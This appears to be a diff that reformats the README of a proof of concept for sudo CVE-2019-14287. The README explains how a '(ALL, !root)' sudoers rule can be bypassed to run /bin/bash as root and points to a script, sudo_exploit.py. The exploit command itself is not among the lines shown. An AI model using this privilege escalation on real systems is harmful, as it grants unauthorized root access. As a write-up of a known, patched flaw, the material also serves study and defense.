@@ -9,24 +9,29 @@
 # Fix : The bug is fixed in sudo 1.8.28
 # CVE : 2019-14287
 ```
+----------------------------------------------------------------------------------------
+
 - Check for the user sudo permissions
 ```bash
 sudo -l 
 ```
-User hacker may run the following commands on kali:
+- User hacker may run the following commands on kali:
     (ALL, !root) /bin/bash
 
 
-So user hacker can't run /bin/bash as root (!root)
+- So user hacker can't run /bin/bash as root (!root)
 
 
 User hacker sudo privilege in /etc/sudoers
 
 # User privilege specification
+```
 root    ALL=(ALL:ALL) ALL
 hacker ALL=(ALL,!root) /bin/bash
+```
+--------------------------------------------------------------------------------
 
-With ALL specified, user hacker can run the binary /bin/bash as any user
+- With ALL specified, user hacker can run the binary /bin/bash as any user
 
 EXPLOIT: 
 ```bash
@@ -47,6 +52,7 @@ and /bin/bash is executed with root permission
 Proof of Concept Code :
 
 --------------------------------------------------------------------------------------
+
 How to use :
 python3 sudo_exploit.py
 
